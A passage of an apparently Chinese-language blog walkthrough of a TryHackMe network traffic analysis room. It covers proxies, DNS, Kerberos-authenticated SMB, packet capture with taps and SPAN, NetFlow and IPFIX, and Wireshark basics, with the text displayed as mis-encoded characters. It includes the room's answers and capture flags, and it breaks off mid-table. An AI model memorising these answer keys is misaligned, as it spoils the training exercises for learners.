æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªæ–°çš„TCPä¼šè¯ï¼Œå¹¶å°†å®¢æˆ·ç«¯çš„è¯·æ±‚è½¬å‘å‡ºåŽ»ã€‚å½“ Webä»£ç†æ”¶åˆ° Web æœåŠ¡å™¨çš„å“åº”æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å“åº”å†…å®¹ï¼Œå¦‚æžœè®¤ä¸ºå®‰å…¨ï¼Œåˆ™å°†å…¶è½¬å‘ç»™ä¸»æœºã€‚æ€»è€Œè¨€ä¹‹ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªä¼šè¯ï¼Œä¸€ä¸ªåœ¨å®¢æˆ·ç«¯å’Œä»£ç†ä¹‹é—´ï¼Œå¦ä¸€ä¸ªåœ¨ä»£ç†å’Œ Web æœåŠ¡å™¨ä¹‹é—´ã€‚ä»Žå®¢æˆ·ç«¯çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒå·²ç»ä¸Ž Web æœåŠ¡å™¨å»ºç«‹äº†ä¸€ä¸ªä¼šè¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/53a59fe5dcfd3f5124649caf2bdb0a4e.png\" /></p>\n<p><strong>ä¼ä¸šç½‘ç»œå†…éƒ¨çš„å¤–éƒ¨DNS</strong><br />\né€šä¿¡å§‹äºŽä¸»æœºå‘é€DNSæŸ¥è¯¢ã€‚ä¸»æœºå°†æŸ¥è¯¢å‘é€åˆ°ç«¯å£ 53 çš„å†…éƒ¨DNSæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨å°†ä»£è¡¨ä¸»æœºæ‰§è¡Œæ“ä½œã€‚é¦–å…ˆï¼Œå®ƒä¼šæ£€æŸ¥ç¼“å­˜ä¸­æ˜¯å¦æœ‰è¯¥æŸ¥è¯¢çš„ç­”æ¡ˆï¼›å¦‚æžœæ²¡æœ‰ï¼Œå®ƒä¼šå°†æŸ¥è¯¢é€šè¿‡è·¯ç”±å™¨å’Œé˜²ç«å¢™å‘é€åˆ°å·²é…ç½®çš„DNSæœåŠ¡å™¨ã€‚ç„¶åŽï¼Œç­”æ¡ˆå°†æ²¿ç€ç›¸åŒçš„è·¯å¾„åˆ°è¾¾å†…éƒ¨DNS æœåŠ¡å™¨ï¼Œæœ€ç»ˆç”±å†…éƒ¨ DNSæœåŠ¡å™¨è½¬å‘ç»™ä¸»æœºã€‚ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªç®€åŒ–çš„æµç¨‹å›¾ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/015959337deb214093fccd2ba8d3236c.png\" /></p>\n<p><strong>ä½¿ç”¨Kerberosçš„SMB åè®®ï¼š</strong><br />\nå½“ä¸»æœºæ‰“å¼€ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼ˆä¾‹å¦‚ \\FILESERVER\\MARKETINGï¼‰æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªSMBä¼šè¯ã€‚é¦–å…ˆï¼Œé€šè¿‡Kerberosè¿›è¡Œèº«ä»½éªŒè¯ã€‚å½“ç”¨æˆ·ç™»å½•ä¸»æœºæ—¶ï¼Œå®ƒä¼šå‘åŸŸæŽ§åˆ¶å™¨ä¸Šçš„å¯†é’¥åˆ†å‘ä¸­å¿ƒ<strong>è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶æ”¶åˆ°ä¸€ä¸ªç¥¨è¯æŽˆäºˆç¥¨æ® (TGT)ï¼Œç”¨äºŽè¯·æ±‚â€œæœåŠ¡èº«ä»½éªŒè¯ç¥¨æ®â€</strong>ã€‚ç„¶åŽï¼Œä¸»æœºä½¿ç”¨ä¹‹å‰æ”¶åˆ°çš„ TGT è¯·æ±‚æœåŠ¡ç¥¨æ®ã€‚ä¸»æœºéšåŽä½¿ç”¨æ­¤ç¥¨æ®å»ºç«‹SMBè¿žæŽ¥ã€‚SMB ä¼šè¯å»ºç«‹åŽï¼Œä¸»æœºå³å¯è®¿é—®è¯¥å…±äº«æ–‡ä»¶å¤¹ã€‚ä¸‹å›¾æ˜¯è¯¥æµç¨‹çš„ç®€åŒ–ç½‘ç»œå›¾ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5ac5db973b430643747ba89a7e757297.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>ç½‘ç»œä¸­å“ªç±»è®¾å¤‡äº§ç”Ÿçš„æµé‡æœ€å¤§ï¼Ÿ</p>\n<pre><code class=\"language-python\">endpoint\n</code></pre>\n<p>å»ºç«‹ SMB ä¼šè¯ä¹‹å‰ï¼Œéœ€è¦å…ˆè”ç³»å“ªä¸ªæœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ</p>\n<pre><code class=\"language-python\">kerberos\n</code></pre>\n<p>TLSæ˜¯ä»€ä¹ˆçš„ç¼©å†™ï¼Ÿ</p>\n<pre><code class=\"language-python\">Transport Layer Security\n</code></pre>\n<h4 id=\"æˆ‘ä»¬å¦‚ä½•è§‚å¯Ÿç½‘ç»œæµé‡\">æˆ‘ä»¬å¦‚ä½•è§‚å¯Ÿç½‘ç»œæµé‡?</h4>\n<p>æ—¢ç„¶æˆ‘ä»¬å·²ç»äº†è§£äº†ç½‘ç»œä¸­å¯ä»¥ä¸”åº”è¯¥è§‚å¯Ÿçš„å†…å®¹ï¼ŒæŽ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è¿›è¡Œè§‚å¯Ÿã€‚æ­£å¦‚å¼•è¨€ä¸­æ‰€è¿°ï¼Œç½‘ç»œæµé‡åˆ†æžä¾§é‡äºŽæ•´åˆå¤šç§ä¿¡æ¯æºï¼Œå¯¹å…¶è¿›è¡Œåˆ†æžï¼Œå‘çŽ°å…¶ä¸­çš„æ¨¡å¼ï¼Œå¹¶åˆ©ç”¨åˆ†æžç»“æžœæŒ‡å¯¼åŽç»­è¡ŒåŠ¨ã€‚</p>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼èŽ·å–è¿™äº›ä¿¡æ¯æ¥æºï¼š</p>\n<ul>\n<li>æ—¥å¿—</li>\n<li>å®Œæ•´æ•°æ®åŒ…æ•èŽ·</li>\n<li>ç½‘ç»œç»Ÿè®¡</li>\n</ul>\n<h5 id=\"æ—¥å¿—\">æ—¥å¿—</h5>\n<p>æ—¥å¿—æ˜¯æˆ‘ä»¬èŽ·å–ç½‘ç»œè¿è¡Œä¿¡æ¯çš„é¦–è¦é€”å¾„ã€‚ç½‘ç»œä¸­çš„æ¯ä¸ªç³»ç»Ÿå’Œåè®®éƒ½åŒ…å«è®°å½•ä¿¡æ¯çš„æ–¹å¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®å‰å¹¶æ²¡æœ‰é€‚ç”¨äºŽæ‰€æœ‰ç³»ç»Ÿå’Œåè®®çš„é€šç”¨æ—¥å¿—è®°å½•æ ‡å‡†ã€‚æ¯ä¸ªåŽ‚å•†éƒ½ä¼šè‡ªè¡Œé€‰æ‹©æ—¥å¿—è®°å½•çš„å®žçŽ°æ–¹å¼ã€‚ä¾‹å¦‚ï¼Œå¾®è½¯å®žçŽ°äº† Windows äº‹ä»¶æ—¥å¿—ã€‚æ­¤å¤–ï¼Œè®°å½•å“ªäº›æ•°æ®ä¹Ÿå–å†³äºŽåŽ‚å•†ã€‚å¤§å¤šæ•°åŽ‚å•†ä¸ä¼šè®°å½•æ•°æ®åŒ…è¿›å‡ºç³»ç»Ÿæ—¶çš„å®Œæ•´ä¿¡æ¯ï¼Œè€Œæ˜¯ä¼šè®°å½•ä¸€äº›ä»–ä»¬è®¤ä¸ºæœ‰ç”¨çš„å­—æ®µï¼Œä¾‹å¦‚æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€ã€‚åœ¨ä¸‹é¢çš„ç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›ç¤ºä¾‹æ—¥å¿—ï¼Œä¾‹å¦‚ä½¿ç”¨ Syslog æ ¼å¼çš„Linuxä¸»æœºèº«ä»½éªŒè¯æ—¥å¿—å’Œä½¿ç”¨ CLF æ ‡å‡†çš„Apache Web æœåŠ¡å™¨è®¿é—®æ—¥å¿—ã€‚</p>\n<pre><code class=\"language-bash\"># Auth log\nOct  8 11:20:15 web01 sshd[2145]: Accepted password for gensane from 192.168.1.50 port 52234 ssh2\n\n# Apache web server access log\n192.168.1.50 - - [08/Oct/2025:11:20:18 +0200] \"GET /index.html HTTP/1.1\" 200 2326 \"-\" \"Mozilla/5.0\"\n</code></pre>\n<p>å°½ç®¡æ²¡æœ‰æ ‡å‡†çš„æ—¥å¿—è®°å½•æ–¹å¼ï¼Œä½†æœ‰ä¸€äº›åè®®æä¾›äº†ä¸€ç§å°†æ—¥å¿—æ¶ˆæ¯ä»Žè®¾å¤‡å‘é€åˆ°æ”¶é›†å™¨çš„æ ‡å‡†åŒ–æ–¹å¼ï¼Œä¾‹å¦‚ Syslog å’Œ SNMPã€‚</p>\n<p>å½“æ—¥å¿—æä¾›çš„ä¿¡æ¯ä¸è¶³æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»æ·±å…¥æŒ–æŽ˜ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…³è”æ—¥å¿—ã€æ£€æŸ¥å®Œæ•´çš„æ•°æ®åŒ…æ•èŽ·å¹¶æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯ã€‚</p>\n<h5 id=\"å®Œæ•´æ•°æ®åŒ…æ•èŽ·\">å®Œæ•´æ•°æ®åŒ…æ•èŽ·</h5>\n<p>åœ¨ä»»åŠ¡ä¸‰ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†å®Œæ•´æ•°æ®åŒ…çš„ç»“æž„ã€‚çŽ°åœ¨ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“å¦‚ä½•æ•èŽ·å’Œæ£€æŸ¥è¿™äº›æ•°æ®åŒ…ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ï¼š</p>\n<ul>\n<li>å®‰è£…ç‰©ç†ç½‘ç»œåˆ†è·¯å™¨</li>\n<li>é…ç½®ç«¯å£é•œåƒ</li>\n</ul>\n<p><strong>ç½‘ç»œåˆ†è·¯å™¨ï¼ˆNetwork</strong><br />\nTAPï¼‰æ˜¯ä¸€ç§å¯ä»¥ä¸²è”åˆ°ç½‘ç»œä¸­çš„ç‰©ç†è®¾å¤‡ã€‚è¿™äº›è®¾å¤‡ä¼šå¤åˆ¶æ‰€æœ‰ç»è¿‡çš„ç½‘ç»œæµé‡ï¼Œè€Œä¸ä¼šå½±å“ç½‘ç»œæ€§èƒ½ã€‚å¤åˆ¶çš„æ•°æ®éšåŽä¼šé€šè¿‡ä¸“ç”¨çš„ç›‘æŽ§ç«¯å£è½¬å‘åˆ°æ•°æ®åŒ…æ•èŽ·è®¾å¤‡ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰æˆ–å…¶ä»–ç³»ç»Ÿã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç½‘ç»œåˆ†è·¯å™¨ä»…åœ¨ TCP/IP æ¨¡åž‹çš„é“¾è·¯å±‚å·¥ä½œï¼›å®ƒä¸éœ€è¦ MAC æˆ– IP åœ°å€ï¼Œå› ä¸ºå®ƒå¤åˆ¶çš„æ˜¯ç”µä¿¡å·/å…‰ä¿¡å·å¹¶å°†å…¶å‘é€åˆ°ç›‘æŽ§ç«¯å£ã€‚è¿™æ ·ï¼Œå°±ä¸ä¼šå¢žåŠ ç½‘ç»œå»¶è¿Ÿã€‚ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªç½‘ç»œåˆ†è·¯å™¨çš„ç¤ºä¾‹ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d5a6bbb846daf8dd74a8f448fa72c3e8.png\" /></p>\n<p><strong>ç«¯å£</strong><br />\né•œåƒæ˜¯ä¸€ç§è½¯ä»¶æ–¹æ³•ï¼Œç”¨äºŽå°†æ•°æ®åŒ…ä»Žä¸­é—´è®¾å¤‡ä¸Šçš„ä¸€ä¸ªç«¯å£å¤åˆ¶åˆ°è¿žæŽ¥åˆ°ä¾‹å¦‚å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)ã€æ•°æ®åŒ…æ•èŽ·è®¾å¤‡æˆ–å…¶ä»–ç³»ç»Ÿçš„å¦ä¸€ä¸ªç«¯å£ã€‚æ¯ä¸ªåŽ‚å•†éƒ½æœ‰è‡ªå·±çš„å‘½åã€‚ä¾‹å¦‚ï¼Œæ€ç§‘ç§°ä¹‹ä¸º SPANã€‚åœ¨ä¸‹é¢çš„ç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä½•åœ¨æ€ç§‘è®¾å¤‡ä¸Šé…ç½® SPANã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œç»è¿‡çš„æ•°æ®åŒ…<code>fastEthernet0/1</code>å°†è¢«å¤åˆ¶å¹¶å‘é€åˆ°å¦ä¸€ä¸ªç«¯å£<code>fastEthernet0/2</code>ã€‚</p>\n<pre><code class=\"language-json\">Switch(config)# monitor session 1 source interface fastEthernet0/1\nSwitch(config)# monitor session 1 destination interface fastEthernet0/2\n</code></pre>\n<p>ä¸‹å›¾å±•ç¤ºäº†å…¶å·¥ä½œåŽŸç†ã€‚WIN-001 é€šè¿‡äº¤æ¢æœºå‘é€æ•°æ®åŒ…ä¸ŽæœåŠ¡å™¨é€šä¿¡ã€‚æ•°æ®åŒ…åˆ°è¾¾äº¤æ¢æœºåŽï¼Œä¼šè¢«å¤åˆ¶ä¸€ä»½å¹¶å‘é€åˆ°ç›‘æŽ§è®¾å¤‡ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c0486d6d1ab0dc7d601e718ecd239030.png\" /></p>\n<p>è¯·æ³¨æ„ï¼Œä¸­é—´è®¾å¤‡ä¸ä¸€å®šæ˜¯ç‰©ç†è®¾å¤‡ï¼Œç«¯å£é•œåƒä¹Ÿå¯ä»¥é…ç½®åœ¨è™šæ‹Ÿè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚ VMware vSwitchã€‚äº‘çŽ¯å¢ƒä¹Ÿæä¾›ä¸“é—¨çš„é•œåƒæœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒAWS æä¾› VPC æµé‡é•œåƒã€‚</p>\n<p><strong>æœ€ä½³å®žè·µï¼š</strong><br />\nè¿›è¡Œå®Œæ•´æ•°æ®åŒ…æ•èŽ·æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>\n<ul>\n<li>æ”¾ç½®ä½ç½®ï¼šæ ¹æ®æˆ‘ä»¬è¦æ•èŽ·çš„æµé‡ç±»åž‹ï¼Œæˆ‘ä»¬éœ€è¦å°† TAP æ”¾ç½®åœ¨æ­£ç¡®çš„ä½ç½®æˆ–å°†é•œåƒé…ç½®åœ¨æ­£ç¡®çš„ä½ç½®ã€‚</li>\n<li>æŒç»­æ—¶é—´ï¼šå®Œæ•´çš„æ•°æ®åŒ…æ•èŽ·éœ€è¦ç›¸åº”çš„å­˜å‚¨ç©ºé—´ã€‚å¦‚æžœåœ¨ 1 Gbps çš„çº¿è·¯ä¸Šæ•èŽ·ä¸€æ•´å¤©çš„æµé‡ï¼Œå¹³å‡éœ€è¦ 10.8 TB çš„å­˜å‚¨ç©ºé—´ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œåœ¨ 10Gb æˆ– 40Gb çš„çº¿è·¯ä¸Šï¼Œæˆ‘ä»¬éœ€è¦å¤šå°‘å­˜å‚¨ç©ºé—´ã€‚</li>\n<li>é•œåƒä¸Žåˆ†è·¯ï¼šç‰©ç†åˆ†è·¯å‡ ä¹Žä¸ä¼šé€ æˆæ€§èƒ½æŸå¤±ã€‚è€Œé•œåƒåœ¨å¤§é‡æµé‡é€šè¿‡é•œåƒç«¯å£æ—¶å¯èƒ½ä¼šå½±å“æ€§èƒ½ã€‚</li>\n</ul>\n<p><strong>å·¥å…·</strong><br />\nçŽ°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº†å¦‚ä½•è¿›è¡Œå®Œæ•´çš„æ•°æ®åŒ…æ•èŽ·ï¼ŒæŽ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹å¯ç”¨äºŽåˆ†æžè¿™äº›æ•°æ®åŒ…çš„å·¥å…·ï¼š</p>\n<ul>\n<li>Wireshark</li>\n<li>TCPdump</li>\n<li>IPS / IDSç±»ä¼¼ Snortã€Suricata å’ŒZeek</li>\n</ul>\n<p>ä»¥ä¸Šåˆ—ä¸¾çš„æ˜¯å¯ç”¨äºŽåˆ†æžå®Œæ•´æ•°æ®åŒ…æ•èŽ·çš„ä¼—å¤šå·¥å…·ä¸­çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æœ¬æ¨¡å—çš„åŽç»­ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹ä»‹ç» Wireshark çš„ä½¿ç”¨ã€‚</p>\n<h5 id=\"ç½‘ç»œç»Ÿè®¡\">ç½‘ç»œç»Ÿè®¡</h5>\n<p>å¦ä¸€ç§æŸ¥æ‰¾ç½‘ç»œå¼‚å¸¸çš„å¥½æ–¹æ³•æ˜¯æ”¶é›†ç½‘ç»œä¸­æ•°æ®æµçš„å…ƒæ•°æ®ï¼Œä¾‹å¦‚ç»Ÿè®¡ä¸»æœºå‘é€çš„DNSè¯·æ±‚æ•°é‡ã€‚ä¸€äº›åè®®å¯ä»¥å®žçŽ°è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å°†ç®€è¦è®¨è®ºå…¶ä¸­çš„ä¸¤ç§ï¼šNetFlowå’ŒIPFIXã€‚</p>\n<p><strong>NetFlow</strong>æ˜¯æ€ç§‘å¼€å‘çš„ä¸€ç§åè®®ï¼Œç”¨äºŽæ”¶é›†ç½‘ç»œä¸­æµé‡çš„å…ƒæ•°æ®ã€‚å®ƒæ˜¯æ£€æµ‹C2æµé‡ã€æ•°æ®æ³„éœ²å’Œæ¨ªå‘ç§»åŠ¨ç­‰é—®é¢˜çš„æœ‰æ•ˆæ–¹æ³•ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªNetFlowè¾“å‡ºç¤ºä¾‹ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥ç¤ºä¾‹ä¸åŒ…å«å•ä¸ªæ•°æ®åŒ…ï¼Œè€Œæ˜¯åŒ…å«ä»Žæº IP åœ°å€ 12.1.1.1 åˆ°ç›®æ ‡ IP åœ°å€ 13.1.1.2 çš„æ•°æ®åŒ…æµçš„å…ƒæ•°æ®ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/0f020cd48a2b37e1a082ca91dfa30208.png\" /><br />\n<strong>äº’è”ç½‘åè®®æµä¿¡æ¯å¯¼å‡ºåè®® ( IPFIX )</strong>å¯ä»¥è¢«è§†ä¸ºNetFlowçš„ç»§ä»»è€…ã€‚NetFlowæœ€åˆæ˜¯æ€ç§‘çš„ä¸“æœ‰åè®®ï¼Œè¿™æ„å‘³ç€è¯¥åè®®æœ€åˆä»…ä¾›æ€ç§‘ç³»ç»Ÿä½¿ç”¨ã€‚ç›´åˆ°NetFlow v9 ç‰ˆæœ¬ï¼Œæ€ç§‘æ‰å¼•å…¥æ¨¡æ¿åŠŸèƒ½ï¼Œä»¥ä¾¿å…¶ä»–åŽ‚å•†èƒ½å¤Ÿå°†å…¶é€‚é…åˆ°è‡ªå·±çš„è®¾å¤‡ä¸Šã€‚äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ (IETF)ä¸Žæ€ç§‘åŠå…¶ä»–åŽ‚å•†åˆä½œåˆ›å»ºäº†IPFIXï¼Œå¹¶å°†å…¶ä½œä¸ºåŽ‚å•†ä¸­ç«‹çš„æ ‡å‡†å‘å¸ƒã€‚IPFIX æä¾›ä¸ŽNetFlowç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†åœ¨é…ç½®è¦æ•èŽ·çš„å­—æ®µæ–¹é¢æ›´åŠ çµæ´»ã€‚</p>\n<p><strong>è¦å®žçŽ°NetFlowæˆ–IPFIX</strong>ï¼Œæˆ‘ä»¬ä¸éœ€è¦å…¨æ–°çš„åŸºç¡€è®¾æ–½æˆ–ä¸“ç”¨æœåŠ¡å™¨ã€‚å¤§å¤šæ•°åŽ‚å•†éƒ½åœ¨å…¶è®¾å¤‡ä¸­é»˜è®¤å®žçŽ°äº†è¿™äº›åè®®ã€‚æˆ‘ä»¬åªéœ€è¦å¯ç”¨å¹¶é…ç½®åè®®ï¼Œå¹¶æä¾›ä¸€ä¸ªæŽ¥æ”¶å…ƒæ•°æ®çš„ä½ç½®å³å¯ã€‚æ‚¨æ— éœ€ä¸“ç”¨æœåŠ¡å™¨æ¥æ”¶é›†è¿™äº›æ•°æ®ï¼›è®¸å¤šä¸‹ä¸€ä»£é˜²ç«å¢™ (NGFW)ã€å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ (IPS)å’Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)éƒ½å†…ç½®äº†æ”¶é›†å’Œåˆ†æžæµé‡æ•°æ®çš„æœºåˆ¶ã€‚</p>\n<hr />\n<p>æˆ‘æ”¾åœ¨äº†webproxyå’Œé˜²ç«å¢™ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯è¯´æµé‡è¿›åŽ»çš„æ—¶å€™çš„é‚£ä¸ªèŠ‚ç‚¹ï¼Œé‚£å°±èƒ½çœ‹åˆ°æ‰€æœ‰çš„æµé‡äº†<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/92eb41c8e85315dc51c305c7ff4cd083.png\" /></p>\n<p>è¿™é‡Œæ˜¯è¦çœ‹dnsæµé‡ï¼Œé‚£å°±æ”¾åœ¨dnsè¯·æ±‚çš„dnsæœåŠ¡å‰å³å¯<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/eea64cf40dbba00d6be6309953b7479f.png\" /></p>\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>åœºæ™¯ 1 ä¸­ HTTP æµé‡é‡ŒåŒ…å«çš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿè¯¥æ ‡å¿—çš„æ ¼å¼ä¸º THM{}ã€‚</p>\n<pre><code class=\"language-python\">THM{FoundTheMalware}\n</code></pre>\n<p>åœºæ™¯ 2 ä¸­ DNS æµé‡é‡Œå‘çŽ°çš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿè¯¥æ ‡å¿—çš„æ ¼å¼ä¸º THM{}ã€‚</p>\n<pre><code class=\"language-python\">THM{C2CommandFound}\n</code></pre>\n<h3 id=\"wiresharkåŸºç¡€çŸ¥è¯†\">Wiresharkï¼šåŸºç¡€çŸ¥è¯†</h3>\n<h4 id=\"ä»‹ç»-1\">ä»‹ç»</h4>\n<p>Wireshark æ˜¯ä¸€æ¬¾å¼€æºã€è·¨å¹³å°çš„ç½‘ç»œæ•°æ®åŒ…åˆ†æžå·¥å…·ï¼Œèƒ½å¤Ÿå—…æŽ¢å’Œåˆ†æžå®žæ—¶ç½‘ç»œæµé‡ï¼Œå¹¶æ£€æŸ¥æ•°æ®åŒ…æ•èŽ·æ–‡ä»¶ï¼ˆPCAPï¼‰ã€‚å®ƒè¢«å¹¿æ³›è®¤ä¸ºæ˜¯æœ€ä½³æ•°æ®åŒ…åˆ†æžå·¥å…·ä¹‹ä¸€ã€‚åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹  Wireshark çš„åŸºç¡€çŸ¥è¯†ï¼Œå¹¶ä½¿ç”¨å®ƒè¿›è¡ŒåŸºæœ¬çš„æ•°æ®åŒ…åˆ†æžã€‚</p>\n<h5 id=\"å­¦ä¹ ç›®æ ‡\">å­¦ä¹ ç›®æ ‡</h5>\n<ul>\n<li>æµè§ˆå’Œé…ç½® Wireshark</li>\n<li>æ£€æŸ¥æ•°æ®åŒ…å¹¶ä»ŽTCP /IPçš„ä¸åŒå±‚ä¸­å‘çŽ°ä¿¡æ¯ã€‚</li>\n<li>åº”ç”¨æ˜¾ç¤ºç­›é€‰å™¨</li>\n</ul>\n<h4 id=\"å·¥å…·æè¿°\">å·¥å…·æè¿°</h4>\n<h5 id=\"ç”¨ä¾‹\">ç”¨ä¾‹</h5>\n<p>Wiresharkæ˜¯ç›®å‰å¸‚é¢ä¸ŠåŠŸèƒ½æœ€å¼ºå¤§çš„æµé‡åˆ†æžå·¥å…·ä¹‹ä¸€ã€‚å®ƒæœ‰å¤šç§ç”¨é€”ï¼š</p>\n<ul>\n<li>æ£€æµ‹å’ŒæŽ’é™¤ç½‘ç»œé—®é¢˜ï¼Œä¾‹å¦‚ç½‘ç»œè´Ÿè½½æ•…éšœç‚¹å’Œæ‹¥å¡žã€‚</li>\n<li>æ£€æµ‹å®‰å…¨å¼‚å¸¸æƒ…å†µï¼Œä¾‹å¦‚æ¶æ„ä¸»æœºã€å¼‚å¸¸ç«¯å£ä½¿ç”¨æƒ…å†µå’Œå¯ç–‘æµé‡ã€‚</li>\n<li>è°ƒæŸ¥å’Œå­¦ä¹ åè®®ç»†èŠ‚ï¼Œä¾‹å¦‚å“åº”ä»£ç å’Œæœ‰æ•ˆè½½è·æ•°æ®ã€‚</li>\n</ul>\n<p>æ³¨æ„ï¼šWireshark å¹¶éžå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ ( IDS )ã€‚å®ƒä»…å…è®¸åˆ†æžäººå‘˜å‘çŽ°å¹¶æ·±å…¥è°ƒæŸ¥æ•°æ®åŒ…ã€‚å®ƒä¸ä¼šä¿®æ”¹æ•°æ®åŒ…ï¼Œåªæ˜¯è¯»å–å®ƒä»¬ã€‚å› æ­¤ï¼Œæ£€æµ‹ä»»ä½•å¼‚å¸¸æˆ–ç½‘ç»œé—®é¢˜éƒ½é«˜åº¦ä¾èµ–äºŽåˆ†æžäººå‘˜çš„çŸ¥è¯†å’Œè°ƒæŸ¥æŠ€èƒ½ã€‚</p>\n<p>è™šæ‹Ÿæœºä¸­æä¾›äº†ä¸¤ä¸ªæ•èŽ·æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›<code>http1.pcapng</code>æ–‡ä»¶æ¥æ¨¡æ‹Ÿå±å¹•æˆªå›¾ä¸­çš„æ“ä½œã€‚è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦ä½¿ç”¨è¿™äº›<code>Exercise.pcapng</code>æ–‡ä»¶æ¥å›žç­”é—®é¢˜ã€‚</p>\n<h5 id=\"å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œæ•°æ®\">å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œæ•°æ®</h5>\n<p>Wiresharkå›¾å½¢ç”¨æˆ·ç•Œé¢æ‰“å¼€åŽä¼šæ˜¾ç¤ºä¸€ä¸ªåŠŸèƒ½é½å…¨çš„å•ä¸€é¡µé¢ï¼Œå¸®åŠ©ç”¨æˆ·ä»¥å¤šç§æ–¹å¼åˆ†æžç½‘ç»œæµé‡ã€‚ä¹ä¸€çœ‹ï¼Œäº”ä¸ªéƒ¨åˆ†éžå¸¸çªå‡ºã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>å·¥å…·æ </strong></th>\n<th>ä¸»å·¥å…·æ åŒ…å«å¤šä¸ªç”¨äºŽæ•°æ®åŒ…å—…æŽ¢å’Œå¤„ç†çš„èœå•å’Œå¿«æ·æ–¹å¼ï¼ŒåŒ…æ‹¬è¿‡æ»¤ã€æŽ’åºã€æ±‡æ€»ã€å¯¼å‡ºå’Œåˆå¹¶ã€‚</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>æ˜¾ç¤ºç­›é€‰æ </strong></td>\n<td>ä¸»è¦æŸ¥è¯¢å’Œç­›é€‰éƒ¨åˆ†ã€‚</td>\n</tr>\n<tr>\n<td><strong>æœ€è¿‘çš„æ–‡ä»¶</strong></td>\n<td>æœ€è¿‘è°ƒæŸ¥è¿‡çš„æ–‡ä»¶åˆ—è¡¨ã€‚åŒå‡»å³å¯è°ƒå‡ºåˆ—è¡¨ä¸­çš„æ–‡ä»¶ã€‚</td>\n</tr>\n<tr>\n<td><strong>æ•èŽ·è¿‡æ»¤å™¨å’ŒæŽ¥å£</strong></td>\n<td>æ•èŽ·è¿‡æ»¤å™¨å’Œå¯ç”¨çš„å—…æŽ¢ç‚¹ï¼ˆç½‘ç»œæŽ¥å£ï¼‰ã€‚ç½‘ç»œæŽ¥å£æ˜¯è®¡ç®—æœºä¸Žç½‘ç»œä¹‹é—´çš„è¿žæŽ¥ç‚¹ã€‚è½¯ä»¶è¿žæŽ¥ï¼ˆä¾‹å¦‚ï¼Œloã€eth0 å’Œ ens33ï¼‰å¯ç”¨ç½‘ç»œç¡¬ä»¶ã€‚</td>\n</tr>\n<tr>\n<td><strong>çŠ¶æ€æ 